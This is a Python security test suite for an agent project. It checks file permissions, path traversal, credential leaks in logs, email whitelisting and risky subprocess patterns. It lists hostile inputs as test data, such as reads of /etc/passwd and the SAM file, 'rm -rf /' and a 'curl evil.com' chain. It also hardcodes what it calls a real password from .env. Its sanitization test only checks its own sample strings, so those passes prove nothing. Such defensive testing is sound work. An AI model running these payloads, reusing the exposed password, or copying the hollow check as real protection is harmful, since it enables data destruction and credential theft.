#!/usr/bin/env python3
"""
Security Test Suite for Dharmic Agent
Tests for vulnerabilities identified in security audit

Usage:
    python3 scripts/security_test.py
    python3 scripts/security_test.py --test path_traversal
    python3 scripts/security_test.py --test all
"""

import sys
from pathlib import Path

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src" / "core"))

class SecurityTestSuite:
    """Test suite for security vulnerabilities."""

    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.warnings = 0

    def test_file_permissions(self):
        """Test that sensitive files have correct permissions."""
        print("\n" + "=" * 70)
        print("TEST: File Permissions")
        print("=" * 70)

        project_root = Path(__file__).parent.parent

        tests = [
            (".env", 0o600, "Credential file"),
            ("memory/dharmic_agent.db", 0o600, "Database file"),
            ("memory/deep_memory.db", 0o600, "Deep memory database"),
        ]

        for file_path, expected_perm, description in tests:
            full_path = project_root / file_path
            if not full_path.exists():
                print(f"  ⚠ SKIP: {file_path} ({description}) - file not found")
                self.warnings += 1
                continue

            actual_perm = full_path.stat().st_mode & 0o777
            if actual_perm == expected_perm:
                print(f"  ✓ PASS: {file_path} - {oct(actual_perm)} (correct)")
                self.passed += 1
            else:
                print(f"  ✗ FAIL: {file_path} - {oct(actual_perm)} (expected {oct(expected_perm)})")
                print(f"         Fix with: chmod {oct(expected_perm)[2:]} {full_path}")
                self.failed += 1

    def test_path_traversal_protection(self):
        """Test path traversal vulnerability protection."""
        print("\n" + "=" * 70)
        print("TEST: Path Traversal Protection")
        print("=" * 70)

        try:
            from vault_bridge import VaultBridge
        except ImportError:
            print("  ⚠ SKIP: vault_bridge not available")
            self.warnings += 1
            return

        vault = VaultBridge()

        # Test cases
        malicious_names = [
            "../../../.env",
            "../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "/etc/shadow",
            "../../../../Users",
            "test/../../../etc/passwd",
        ]

        for name in malicious_names:
            try:
                result = vault.get_crown_jewel(name)
                if result is None:
                    print(f"  ✓ PASS: Blocked path traversal: {name}")
                    self.passed += 1
                else:
                    print(f"  ✗ FAIL: Path traversal succeeded: {name}")
                    print(f"         Content length: {len(result)}")
                    self.failed += 1
            except Exception as e:
                # Exception is acceptable - means it was blocked
                print(f"  ✓ PASS: Exception raised for: {name} ({type(e).__name__})")
                self.passed += 1

    def test_input_sanitization(self):
        """Test input sanitization for command injection."""
        print("\n" + "=" * 70)
        print("TEST: Input Sanitization")
        print("=" * 70)

        # Mock email messages with malicious content
        malicious_inputs = [
            ('"; rm -rf /', "Command injection via semicolon"),
            ('$(cat /etc/passwd)', "Command substitution"),
            ('`whoami`', "Backtick command execution"),
            ('| cat /etc/passwd', "Pipe to external command"),
            ('&& curl evil.com', "Command chaining"),
            ('\x00/etc/passwd', "Null byte injection"),
            ('../../etc/passwd', "Path traversal in subject"),
        ]

        print("  Testing dangerous patterns in email content:")
        for malicious, description in malicious_inputs:
            # Check if string contains dangerous patterns
            dangerous_chars = ['$', '`', '|', '&', ';', '\x00']
            is_dangerous = any(char in malicious for char in dangerous_chars)

            if is_dangerous:
                print(f"  ✓ DETECTED: {description}")
                print(f"            Pattern: {repr(malicious[:30])}")
                self.passed += 1
            else:
                print(f"  ⚠ WARNING: Pattern may not be detected: {description}")
                self.warnings += 1

        print("\n  Note: Actual sanitization must be implemented in email_daemon.py")

    def test_credential_exposure(self):
        """Test for credential exposure in logs and files."""
        print("\n" + "=" * 70)
        print("TEST: Credential Exposure")
        print("=" * 70)

        project_root = Path(__file__).parent.parent

        # Check .env file
        env_file = project_root / ".env"
        if env_file.exists():
            content = env_file.read_text()
            if "PASSWORD=" in content or "API_KEY=" in content:
                print("  ⚠ WARNING: Credentials found in .env")
                print("            Consider migrating to keychain")
                self.warnings += 1

        # Check log files for passwords
        logs_dir = project_root / "logs"
        if logs_dir.exists():
            log_files = list(logs_dir.rglob("*.log"))
            print(f"  Scanning {len(log_files)} log files...")

            dangerous_patterns = [
                "PASSWORD=",
                "API_KEY=",
                "SECRET=",
                "TOKEN=",
                "eXy3ffoYEiKb",  # The actual password from .env
            ]

            found_exposure = False
            for log_file in log_files:
                try:
                    content = log_file.read_text()
                    for pattern in dangerous_patterns:
                        if pattern in content:
                            print(f"  ✗ FAIL: Found '{pattern}' in {log_file.name}")
                            found_exposure = True
                            self.failed += 1
                            break
                except Exception:
                    continue

            if not found_exposure:
                print("  ✓ PASS: No credential exposure detected in logs")
                self.passed += 1
        else:
            print("  ⚠ SKIP: logs/ directory not found")
            self.warnings += 1

    def test_whitelist_enforcement(self):
        """Test email sender whitelist enforcement."""
        print("\n" + "=" * 70)
        print("TEST: Email Whitelist Enforcement")
        print("=" * 70)

        try:
            from email_daemon import EmailDaemon, EmailConfig
            from dharmic_agent import DharmicAgent
        except ImportError:
            print("  ⚠ SKIP: email_daemon not available")
            self.warnings += 1
            return

        print("  Testing whitelist initialization...")

        # Test 1: Empty whitelist should be rejected (after fix)
        try:
            agent = DharmicAgent()
            config = EmailConfig()
            daemon = EmailDaemon(
                agent=agent,
                config=config,
                allowed_senders=[]  # Empty = dangerous
            )
            print("  ⚠ WARNING: Empty whitelist accepted (should be rejected)")
            print("            Update EmailDaemon to enforce whitelist")
            self.warnings += 1
        except ValueError as e:
            if "whitelist" in str(e).lower() or "allowed_senders" in str(e).lower():
                print("  ✓ PASS: Empty whitelist rejected")
                self.passed += 1
            else:
                print(f"  ⚠ WARNING: Unexpected error: {e}")
                self.warnings += 1
        except Exception as e:
            print(f"  ⚠ WARNING: Could not test whitelist: {type(e).__name__}")
            self.warnings += 1

    def test_subprocess_safety(self):
        """Test subprocess call safety."""
        print("\n" + "=" * 70)
        print("TEST: Subprocess Call Safety")
        print("=" * 70)

        # Scan for dangerous subprocess patterns
        project_root = Path(__file__).parent.parent
        src_files = list((project_root / "src").rglob("*.py"))

        print(f"  Scanning {len(src_files)} Python files...")

        dangerous_patterns = [
            ("shell=True", "Shell injection risk"),
            ("os.system(", "Direct shell execution"),
            ("eval(", "Code injection risk"),
            ("exec(", "Code execution risk"),
        ]

        found_issues = []
        for src_file in src_files:
            try:
                content = src_file.read_text()
                for pattern, risk in dangerous_patterns:
                    if pattern in content:
                        found_issues.append((src_file.name, pattern, risk))
            except Exception:
                continue

        if found_issues:
            for filename, pattern, risk in found_issues:
                print(f"  ⚠ WARNING: Found '{pattern}' in {filename}")
                print(f"            Risk: {risk}")
                self.warnings += 1
        else:
            print("  ✓ PASS: No dangerous subprocess patterns found")
            self.passed += 1

    def test_timeout_limits(self):
        """Test timeout limits on subprocess calls."""
        print("\n" + "=" * 70)
        print("TEST: Timeout Limits")
        print("=" * 70)

        project_root = Path(__file__).parent.parent
        src_files = list((project_root / "src").rglob("*.py"))

        print(f"  Scanning {len(src_files)} files for timeout values...")

        long_timeouts = []
        for src_file in src_files:
            try:
                content = src_file.read_text()
                lines = content.split('\n')
                for i, line in enumerate(lines, 1):
                    if 'timeout=' in line.lower():
                        # Extract timeout value
                        import re
                        match = re.search(r'timeout[=\s]*(\d+)', line)
                        if match:
                            timeout = int(match.group(1))
                            if timeout > 60:  # More than 1 minute
                                long_timeouts.append((src_file.name, i, timeout))
            except Exception:
                continue

        if long_timeouts:
            for filename, line_num, timeout in long_timeouts:
                print(f"  ⚠ WARNING: {filename}:{line_num} - timeout={timeout}s")
                print("            Consider shorter timeout for external input")
                self.warnings += 1
        else:
            print("  ✓ PASS: All timeouts are reasonable (≤60s)")
            self.passed += 1

    def run_all_tests(self):
        """Run all security tests."""
        print("\n" + "=" * 70)
        print("DHARMIC AGENT - SECURITY TEST SUITE")
        print("=" * 70)

        self.test_file_permissions()
        self.test_path_traversal_protection()
        self.test_input_sanitization()
        self.test_credential_exposure()
        self.test_whitelist_enforcement()
        self.test_subprocess_safety()
        self.test_timeout_limits()

        # Summary
        print("\n" + "=" * 70)
        print("TEST SUMMARY")
        print("=" * 70)
        print(f"  ✓ Passed:   {self.passed}")
        print(f"  ✗ Failed:   {self.failed}")
        print(f"  ⚠ Warnings: {self.warnings}")
        print("=" * 70)

        if self.failed > 0:
            print("\n⚠ SECURITY ISSUES DETECTED!")
            print("Review failures and apply fixes from SECURITY_AUDIT_REPORT.md")
            return 1
        elif self.warnings > 0:
            print("\n⚠ Warnings present - review recommendations")
            return 0
        else:
            print("\n✓ All security tests passed!")
            return 0


def main():
    import argparse

    parser = argparse.ArgumentParser(description="Security test suite for Dharmic Agent")
    parser.add_argument(
        "--test",
        choices=[
            "all",
            "permissions",
            "path_traversal",
            "sanitization",
            "credentials",
            "whitelist",
            "subprocess",
            "timeouts"
        ],
        default="all",
        help="Specific test to run (default: all)"
    )

    args = parser.parse_args()

    suite = SecurityTestSuite()

    if args.test == "all":
        return suite.run_all_tests()
    elif args.test == "permissions":
        suite.test_file_permissions()
    elif args.test == "path_traversal":
        suite.test_path_traversal_protection()
    elif args.test == "sanitization":
        suite.test_input_sanitization()
    elif args.test == "credentials":
        suite.test_credential_exposure()
    elif args.test == "whitelist":
        suite.test_whitelist_enforcement()
    elif args.test == "subprocess":
        suite.test_subprocess_safety()
    elif args.test == "timeouts":
        suite.test_timeout_limits()

    # Print summary for single test
    total = suite.passed + suite.failed + suite.warnings
    if total > 0:
        print(f"\nResult: {suite.passed} passed, {suite.failed} failed, {suite.warnings} warnings")

    return 1 if suite.failed > 0 else 0


if __name__ == "__main__":
    sys.exit(main())
